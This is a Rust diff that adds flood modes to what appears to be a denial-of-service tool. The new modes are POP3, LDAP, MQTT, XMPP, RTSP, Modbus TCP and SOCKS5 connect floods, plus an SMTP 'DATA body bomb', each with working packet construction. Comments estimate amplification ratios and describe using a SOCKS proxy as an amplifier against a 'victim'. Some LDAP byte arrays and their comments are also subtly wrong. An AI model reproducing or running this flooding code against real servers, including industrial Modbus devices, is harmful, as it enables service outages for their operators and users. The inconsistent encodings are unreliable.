@@ -7,11 +7,19 @@ pub enum TcpMode {
     SmtpVrfy,
     SmtpExpn,
     SmtpRcptTo,
+    SmtpDataBomb,
     SshAuth,
     FtpBounce,
     FtpList,
     Finger,
     ImapLogin,
+    Pop3Login,
+    LdapSearch,
+    MqttConnect,
+    XmppStream,
+    RtspDescribe,
+    ModbusTcp,
+    SocksConnect,
     SslReneg,
     TelnetNeg,
     GenericConnect,
@@ -23,11 +31,19 @@ impl TcpMode {
             TcpMode::SmtpVrfy => "SMTP VRFY flood",
             TcpMode::SmtpExpn => "SMTP EXPN flood",
             TcpMode::SmtpRcptTo => "SMTP RCPT TO flood",
+            TcpMode::SmtpDataBomb => "SMTP DATA body bomb",
             TcpMode::SshAuth => "SSH auth flood",
             TcpMode::FtpBounce => "FTP PORT bounce",
             TcpMode::FtpList => "FTP LIST amplification",
             TcpMode::Finger => "Finger query flood",
             TcpMode::ImapLogin => "IMAP LOGIN flood",
+            TcpMode::Pop3Login => "POP3 login flood",
+            TcpMode::LdapSearch => "LDAP search flood",
+            TcpMode::MqttConnect => "MQTT connect flood",
+            TcpMode::XmppStream => "XMPP stream flood",
+            TcpMode::RtspDescribe => "RTSP DESCRIBE flood",
+            TcpMode::ModbusTcp => "Modbus TCP flood",
+            TcpMode::SocksConnect => "SOCKS connect flood",
             TcpMode::SslReneg => "SSL renegotiation flood",
             TcpMode::TelnetNeg => "Telnet negotiation flood",
             TcpMode::GenericConnect => "TCP connect flood",
@@ -37,10 +53,18 @@ impl TcpMode {
     pub fn default_port(&self) -> u16 {
         match self {
             TcpMode::SmtpVrfy | TcpMode::SmtpExpn | TcpMode::SmtpRcptTo => 25,
+ TcpMode::SmtpDataBomb => 25,
             TcpMode::SshAuth => 22,
             TcpMode::FtpBounce | TcpMode::FtpList => 21,
             TcpMode::Finger => 79,
             TcpMode::ImapLogin => 143,
+            TcpMode::Pop3Login => 110,
+            TcpMode::LdapSearch => 389,
+            TcpMode::MqttConnect => 1883,
+            TcpMode::XmppStream => 5222,
+            TcpMode::RtspDescribe => 554,
+            TcpMode::ModbusTcp => 502,
+            TcpMode::SocksConnect => 1080,
             TcpMode::SslReneg => 443,
             TcpMode::TelnetNeg => 23,
             TcpMode::GenericConnect => 80,
@@ -52,11 +76,19 @@ impl TcpMode {
             "smtp-vrfy" => Some(TcpMode::SmtpVrfy),
             "smtp-expn" => Some(TcpMode::SmtpExpn),
             "smtp-rcpt" => Some(TcpMode::SmtpRcptTo),
+            "smtp-data" | "smtp-data-bomb" => Some(TcpMode::SmtpDataBomb),
             "ssh-auth" => Some(TcpMode::SshAuth),
             "ftp-bounce" => Some(TcpMode::FtpBounce),
             "ftp-list" => Some(TcpMode::FtpList),
             "finger" => Some(TcpMode::Finger),
             "imap-login" => Some(TcpMode::ImapLogin),
+            "pop3-login" | "pop3" => Some(TcpMode::Pop3Login),
+            "ldap-search" | "ldap" => Some(TcpMode::LdapSearch),
+            "mqtt-connect" | "mqtt" => Some(TcpMode::MqttConnect),
+            "xmpp-stream" | "xmpp" => Some(TcpMode::XmppStream),
+            "rtsp-describe" | "rtsp" => Some(TcpMode::RtspDescribe),
+            "modbus-tcp" | "modbus" => Some(TcpMode::ModbusTcp),
+            "socks-connect" | "socks" | "socks5" => Some(TcpMode::SocksConnect),
             "ssl-reneg" => Some(TcpMode::SslReneg),
             "telnet" => Some(TcpMode::TelnetNeg),
             "tcp-connect" | "generic" => Some(TcpMode::GenericConnect),
@@ -167,11 +199,19 @@ async fn run_protocol(mode: TcpMode, host: &str, port: u16, proxy: Option<&str>)
             TcpMode::SmtpVrfy => smtp_vrfy(&mut stream, &mut buf).await?,
             TcpMode::SmtpExpn => smtp_expn(&mut stream, &mut buf).await?,
             TcpMode::SmtpRcptTo => smtp_rcpt_to(&mut stream, &mut buf).await?,
+            TcpMode::SmtpDataBomb => smtp_data_bomb(&mut stream, &mut buf).await?,
             TcpMode::SshAuth => ssh_auth(&mut stream, &mut buf).await?,
             TcpMode::FtpBounce => ftp_bounce(&mut stream, &mut buf).await?,
             TcpMode::FtpList => ftp_list(&mut stream, &mut buf).await?,
             TcpMode::Finger => finger_query(&mut stream, &mut buf).await?,
             TcpMode::ImapLogin => imap_login(&mut stream, &mut buf).await?,
+            TcpMode::Pop3Login => pop3_login(&mut stream, &mut buf).await?,
+            TcpMode::LdapSearch => ldap_search(&mut stream, &mut buf).await?,
+            TcpMode::MqttConnect => mqtt_connect(&mut stream, &mut buf).await?,
+            TcpMode::XmppStream => xmpp_stream(&mut stream, &mut buf).await?,
+            TcpMode::RtspDescribe => rtsp_describe(&mut stream, &mut buf).await?,
+            TcpMode::ModbusTcp => modbus_tcp(&mut stream, &mut buf).await?,
+            TcpMode::SocksConnect => socks_connect(&mut stream, &mut buf).await?,
             TcpMode::SslReneg => ssl_reneg(&mut stream, &mut buf).await?,
             TcpMode::TelnetNeg => telnet_neg(&mut stream, &mut buf).await?,
             TcpMode::GenericConnect => generic_connect(&mut stream, &mut buf).await?,
@@ -733,4 +773,285 @@ pub async fn run_tcp_load(
     println!("Received:       {} bytes ({} KB)", total_recv, total_recv / 1024);
     println!("Amplification:  {:.1}x", amp_ratio);
     println!("Rate:           {:.0} req/s", total_requests as f64 / elapsed as f64);
+}
+
+// ================================================================
+// SMTP DATA BOMB — sends HELO/MAIL/RCPT/DATA with large body
+// Request: ~320B (HELO+MAIL+RCPT+DATA), Response: per-recipient processing
+// ================================================================
+async fn smtp_data_bomb(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    let mut sent = 0;
+    let mut recv = 0;
+
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    stream.write_all(b"EHLO test\r\n").await.map_err(|e| e.to_string())?;
+    sent += 11;
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    stream.write_all(b"MAIL FROM:<test@test.com>\r\n").await.map_err(|e| e.to_string())?;
+    sent += 28;
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    stream.write_all(b"RCPT TO:<user@test.com>\r\n").await.map_err(|e| e.to_string())?;
+    sent += 26;
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    // DATA with 1KB body — server processes/queues the full message
+    stream.write_all(b"DATA\r\n").await.map_err(|e| e.to_string())?;
+    sent += 6;
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    let body = format!("Subject: test\r\n\r\n{}\r\n.\r\n", "A".repeat(1024));
+    stream.write_all(body.as_bytes()).await.map_err(|e| e.to_string())?;
+    sent += body.len();
+
+    let timeout = tokio::time::sleep(Duration::from_secs(2));
+    tokio::select! {
+        n = stream.read(buf) => {
+            recv += n.unwrap_or(0);
+        }
+        _ = timeout => {}
+    }
+
+    stream.write_all(b"QUIT\r\n").await.ok();
+    sent += 6;
+
+    Ok((sent, recv))
+}
+
+// ================================================================
+// POP3 login flood /110 — USER/PASS login, banner
+// Request: ~40B, Response: ~200-500B (banner + greeting + OK)
+// ================================================================
+async fn pop3_login(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    let mut sent = 0;
+    let mut recv = 0;
+
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    stream.write_all(b"USER test\r\n").await.map_err(|e| e.to_string())?;
+    sent += 11;
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    stream.write_all(b"PASS test\r\n").await.map_err(|e| e.to_string())?;
+    sent += 11;
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    stream.write_all(b"QUIT\r\n").await.ok();
+    sent += 6;
+
+    Ok((sent, recv))
+}
+
+// ================================================================
+// LDAP search flood /389 — Bind + Search, server processes query
+// Request: ~100B, Response: ~500-2000B (search results)
+// ================================================================
+async fn ldap_search(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    let mut sent = 0;
+    let mut recv = 0;
+
+    // LDAP BindRequest (simple auth, protocol version 3)
+    // Sequence tag (0x30) | length | 0x02 0x01 0x03 (version=3)
+    // 0x04 (string) | length | "cn=..."
+    let bind_req: Vec<u8> = vec![
+        0x30, 0x0c, 0x02, 0x01, 0x03, 0x04, 0x00, 0x80, 0x05, 0x63, 0x6e, 0x3d, 0x61, 0x64,
+        0x6d, 0x69, 0x6e,
+    ];
+    stream.write_all(&bind_req).await.map_err(|e| e.to_string())?;
+    sent += bind_req.len();
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    // LDAP SearchRequest — base object, subtree scope, filter (objectClass=*)
+    // Simple filter: (objectClass=*) which returns all objects
+    let search_req: Vec<u8> = vec![
+        0x30, 0x1e, 0x02, 0x01, 0x02,                                      // messageID
+        0x63, 0x19,                                                         // SearchRequest tag
+        0x04, 0x00,                                                         // baseObject (empty)
+        0x0a, 0x01, 0x02,                                                   // scope (wholeSubtree)
+        0x0a, 0x01, 0x00,                                                   // derefAliases (never)
+        0x02, 0x01, 0x00,                                                   // sizeLimit (unlimited)
+        0x02, 0x01, 0x00,                                                   // timeLimit (unlimited)
+        0x01, 0x01, 0x00,                                                   // typesOnly (false)
+        0x87, 0x06, 0x04, 0x03, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3d, 0x2a,
+        // filter: (objectClass=*) - 0x87 = equalityMatch, 0x04 = string length
+    ];
+    stream.write_all(&search_req).await.map_err(|e| e.to_string())?;
+    sent += search_req.len();
+
+    let timeout = tokio::time::sleep(Duration::from_secs(3));
+    tokio::select! {
+        n = stream.read(buf) => {
+            recv += n.unwrap_or(0);
+        }
+        _ = timeout => {}
+    }
+
+    Ok((sent, recv))
+}
+
+// ================================================================
+// MQTT CONNECT flood /1883 — CONNECT, server responds with CONNACK
+// Request: ~30B, Response: ~50-200B (CONNACK + properties)
+// ================================================================
+async fn mqtt_connect(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    let mut sent = 0;
+    let mut recv = 0;
+
+    // MQTT 3.1.1 CONNECT packet
+    // Fixed header: 0x10 (CONNECT), remaining length
+    // Protocol name: "MQTT" (4 bytes), level 4, flags (0x02 = clean session)
+    let mut packet = Vec::new();
+    // Remaining length (variable length): protocol name + version + flags + keepalive + clientid
+    let payload = [
+        0x00, 0x04, b'M', b'Q', b'T', b'T', // protocol name length + name
+        0x04,                                  // protocol level (3.1.1)
+        0x02,                                  // flags (clean session)
+        0x00, 0x0a,                            // keepalive (10s)
+        0x00, 0x04, b't', b'e', b's', b't',   // client ID
+    ];
+    let remaining_len = payload.len() as u8;
+    packet.push(0x10); // CONNECT
+    packet.push(remaining_len);
+    packet.extend_from_slice(&payload);
+
+    stream.write_all(&packet).await.map_err(|e| e.to_string())?;
+    sent += packet.len();
+
+    let timeout = tokio::time::sleep(Duration::from_secs(3));
+    tokio::select! {
+        n = stream.read(buf) => {
+            recv += n.unwrap_or(0);
+        }
+        _ = timeout => {}
+    }
+
+    Ok((sent, recv))
+}
+
+// ================================================================
+// XMPP stream flood /5222 — opens XML stream, server responds
+// Request: ~100B, Response: ~500-2000B (features XML)
+// ================================================================
+async fn xmpp_stream(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    let mut sent = 0;
+    let mut recv = 0;
+
+    let open = b"<?xml version='1.0'?><stream:stream to='test.com' xmlns='jabber:client' xmlns:stream='http://etherx.jabber.org/streams' version='1.0'>";
+    stream.write_all(open).await.map_err(|e| e.to_string())?;
+    sent += open.len();
+
+    let timeout = tokio::time::sleep(Duration::from_secs(3));
+    tokio::select! {
+        n = stream.read(buf) => {
+            recv += n.unwrap_or(0);
+        }
+        _ = timeout => {}
+    }
+
+    Ok((sent, recv))
+}
+
+// ================================================================
+// RTSP DESCRIBE flood /554 — DESCRIBE media stream, SDP response
+// Request: ~100B, Response: ~500-2000B (SDP description)
+// ================================================================
+async fn rtsp_describe(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    let mut sent = 0;
+    let mut recv = 0;
+
+    let msg = b"DESCRIBE rtsp://localhost/media RTSP/1.0\r\nCSeq: 1\r\n\r\n";
+    stream.write_all(msg).await.map_err(|e| e.to_string())?;
+    sent += msg.len();
+
+    let timeout = tokio::time::sleep(Duration::from_secs(3));
+    tokio::select! {
+        n = stream.read(buf) => {
+            recv += n.unwrap_or(0);
+        }
+        _ = timeout => {}
+    }
+
+    Ok((sent, recv))
+}
+
+// ================================================================
+// Modbus TCP flood /502 — Read Holding Registers
+// Request: ~12B, Response: ~50-250B (register values)
+// ================================================================
+async fn modbus_tcp(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    let mut sent = 0;
+    let mut recv = 0;
+
+    // MBAP header (7 bytes) + PDU (5 bytes) = 12 bytes
+    // Transaction ID (2), Protocol ID (2, always 0), Length (2), Unit ID (1)
+    // Function code 0x03 (Read Holding Registers)
+    // Starting address (2), Quantity (2)
+    let req: Vec<u8> = vec![
+        0x00, 0x01, // transaction ID
+        0x00, 0x00, // protocol ID
+        0x00, 0x06, // length (6 bytes follow)
+        0x01,       // unit ID
+        0x03,       // read holding registers
+        0x00, 0x00, // starting address
+        0x00, 0x0A, // quantity (10 registers = 20 bytes response)
+    ];
+    stream.write_all(&req).await.map_err(|e| e.to_string())?;
+    sent += req.len();
+
+    let timeout = tokio::time::sleep(Duration::from_secs(3));
+    tokio::select! {
+        n = stream.read(buf) => {
+            recv += n.unwrap_or(0);
+        }
+        _ = timeout => {}
+    }
+
+    Ok((sent, recv))
+}
+
+// ================================================================
+// SOCKS5 connect flood /1080 — SOCKS5 CONNECT, server handshake
+// Request: ~40B, Response: ~100-300B (handshake + response)
+// ================================================================
+async fn socks_connect(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
+    let mut sent = 0;
+    let mut recv = 0;
+
+    // SOCKS5 greeting: version, nmethods, methods (0x00 = no auth)
+    stream.write_all(&[0x05, 0x01, 0x00]).await.map_err(|e| e.to_string())?;
+    sent += 3;
+    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
+    recv += n;
+
+    // CONNECT to victim:port (uses SOCKS proxy as amplifier)
+    // version, cmd(0x01=CONNECT), rsv, atyp(0x03=domain)
+    let mut req = vec![0x05, 0x01, 0x00, 0x03];
+    let domain = b"example.com";
+    req.push(domain.len() as u8);
+    req.extend_from_slice(domain);
+    req.extend_from_slice(&[0x00, 0x50]); // port 80
+
+    stream.write_all(&req).await.map_err(|e| e.to_string())?;
+    sent += req.len();
+
+    let timeout = tokio::time::sleep(Duration::from_secs(3));
+    tokio::select! {
+        n = stream.read(buf) => {
+            recv += n.unwrap_or(0);
+        }
+        _ = timeout => {}
+    }
+
+    Ok((sent, recv))
 }
